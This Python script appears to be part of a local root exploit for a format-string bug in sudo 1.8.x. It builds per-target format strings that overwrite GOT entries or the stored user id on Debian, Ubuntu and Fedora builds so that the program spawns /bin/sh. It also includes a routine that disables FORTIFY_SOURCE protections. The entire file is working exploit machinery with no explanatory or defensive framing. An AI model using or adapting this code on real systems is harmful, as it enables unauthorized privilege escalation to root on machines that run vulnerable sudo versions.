
binaries = [

	{
		"name" : "sudo 1.8.3p1 (Debian Wheezy i386)",
		"type" : "GOT",

		"arch" : "i386",

		"writes" :
		(
			#   addr       val
			(0x80581bc, 0x804a223), # <free@plt> ->

			# 804a223: movl   $0x8059d80,0x4(%esp)
			#          movl   $0x6,(%esp)
			#          call   8049b60 <getrlimit64@plt>

			(0x80581f4, 0x804b999), # <getrlimit64@plt>

			# 804b999: movl   $0x805408d "/bin/sh" ,(%esp)
			#          mov    %edx,0x4(%esp)
			#          call   8049e30 <execve@plt>

			(0x8059d80, 0x805408d), # make envp not segfault
		),

		"arg_base" : 3503,

		"align" : 16,
		"repeat" : 0x400,

	},

	{
		"name" : "sudo 1.8.3p1 (Debian Wheezy amd64)",
		"type" : "GOT",

		"arch" : "amd64",

		"writes" :
		(
			#   addr       val
			(0x0610238, 0x040a8c6), # <free@plt>

			# 40a8c6: mov    %rbp,%rsi <-- make argv not segfault
			#         mov    %rbp,%rdi
			#         xor    %eax,%eax
			#         callq  402d80 <execl@plt>

			(0x06105b0, 0x04046f6), # <execl@plt>

			# 4046f6: mov    $0x40c2c9 "/bin/sh" ,%edi
			# 4046fb: callq  4029f0 <execve@plt>
		),

		"arg_base" : 25001,

		"align" : 16,
		"repeat" : 0x800,
	},

	{
		"name" : "sudo 1.8.3p1 (Ubuntu 12.04 i386) [ FORTIFY_SOURCE=2 ]",
		"type" : "GOT",

		"arch" : "i386",

		"writes" :
		(
			#   addr       val
			(0x8058038, 0x804c06e), # <free@plt>

			# 804c06e: movzbl 0x179(%esp),%edi <-- NULL
			#          call   80499b0 <getpid@plt>

			(0x80580cc, 0x804b6b5), # <getpid@plt>

			# 804b6b5: mov    %edi,0x8(%esp)
			#          movl   $0x8053e9d "/bin/sh",(%esp)
			#          mov    %edx,0x4(%esp)
			#          call   8049b20 <execve@plt>
		),

		"arg_base" : 6001,

		"align" : 8,
		"repeat" : 0x2000,

		"fortify" : { "flags": 2854, "nargs" : 481 }
	},

	{
		"name" : "sudo 1.8.1p2 (Fedora 16 i386) [ FORTIFY_SOURCE=2 FULL-RELRO ]",
		"type" : "ASK_PASS",

		"arch" : "i386",

		"writes" :
		(
			#   addr       val
			(0x40000000+0x14620-2, 0xffff), # (char *)&user_details.uid-2
		),

		"arg_base" : 6001,

		"align" : 4,
		"repeat" : 0x4000,

		"fortify" : { "flags": 2850, "nargs" : 482 }
	},

]

def le32(addr):
	return ''.join( chr( (addr>>i)&0xff ) for i in range(0,32,8) )

def le64(addr):
	return ''.join( chr( (addr>>i)&0xff ) for i in range(0,64,8) )

def get_pointer(n, arch):
	return { 'i386':le32, 'amd64':le64 }[arch](n)

def get_pointer_size(arch):
	return { 'i386':4, 'amd64':8 }[arch]

def chunks(l, n):
    for i in range(0,len(l), n):
        yield l[i:i+n]

def hexescape(s, linewidth, prefix=""):
	return ('\n'+prefix).join(
		'"'+''.join("\\x%02x"%ord(x) for x in chnk)+'"' for chnk in chunks(s, linewidth))

def fill(n):
	if n < 4:
		return "X"*n
	else:
		return "%1$"+str(n)+"c"

def disarm_fortify(fortify_spec):
	return "%" + str(fortify_spec['flags']) + "$d" + \
	       "%" + str(fortify_spec['nargs']) + "$d%1073741824$d"

def make_fmtstring(fmt_spec):

	writes = sorted(fmt_spec['writes'], key=lambda a:a[1])
	precode = ""
	if 'precode' in fmt_spec:
		precode = fmt_spec['precode']

	n = len(precode)

	if 'prefix' in fmt_spec:
		n += fmt_spec['prefix']

	if precode.find("%") != -1 or writes[0][1] < n:
		return None

	fmt = precode
	testfmt = precode
	pattern = ""

	for i, (addr, val) in enumerate(writes):
		pattern += get_pointer(addr, fmt_spec['arch'])
		fmt+=fill(val-n)
		n=val
		fmt+="%"+str(fmt_spec['arg_base']+i)+"$n"
		testfmt+="%"+str(fmt_spec['arg_base']+i)+"$8x|"

	if len(fmt) > len(testfmt):
		testfmt += "A"*( len(fmt) - len(testfmt) )
	else:
		fmt += "A"*( len(testfmt) - len(fmt) )

	if 'fortify' in fmt_spec:
		fmt += disarm_fortify(fmt_spec['fortify'])
		testfmt += disarm_fortify(fmt_spec['fortify'])

	pattern += ''.join(chr( (x+0x40+len(pattern)) & 0xff )
	                   for x in range( -len(pattern) % fmt_spec['align'] ))

	return { 'fmt':fmt,
	         'testfmt':testfmt,
	         'pattern':pattern,
	         'repeat':fmt_spec['repeat'],
	         'align':fmt_spec['align'],
	         'ptr_size':get_pointer_size(fmt_spec['arch']),
	       }

print """
#include <unistd.h>

enum { """ + ','.join(set(l['type'] for l in binaries)) + """ };

struct
{
	char *name;
	char *fmt, *testfmt, *pattern;
	int type;
	long len, repeat, align;
	long ptr_size;

}
binaries[] =
{
"""

for spec in binaries:
	fmt = make_fmtstring(spec)
	print '\t{'
	print '\t\t.name     = "'+spec['name'] + " ("+spec['type']+')",'
	print '\t\t.type     = '+spec['type']+','
	print '\t\t.fmt      = "'+fmt['fmt'] + '",'
	print '\t\t.testfmt  = "'+fmt['testfmt'] + '",'
	print '\t\t.pattern  = '+hexescape(fmt['pattern'],
	                                   fmt['ptr_size'],
	                                   prefix= "\t\t            ") + ','
	print '\t\t.len      = '+str(len(fmt['pattern'])) + ','
	print '\t\t.repeat   = '+str(fmt['repeat']) + ','
	print '\t\t.align    = '+str(fmt['align']) + ','
	print '\t\t.ptr_size = '+str(fmt['ptr_size']) + ','
	print '\t},'

print """
	{ .name = NULL },
};
"""
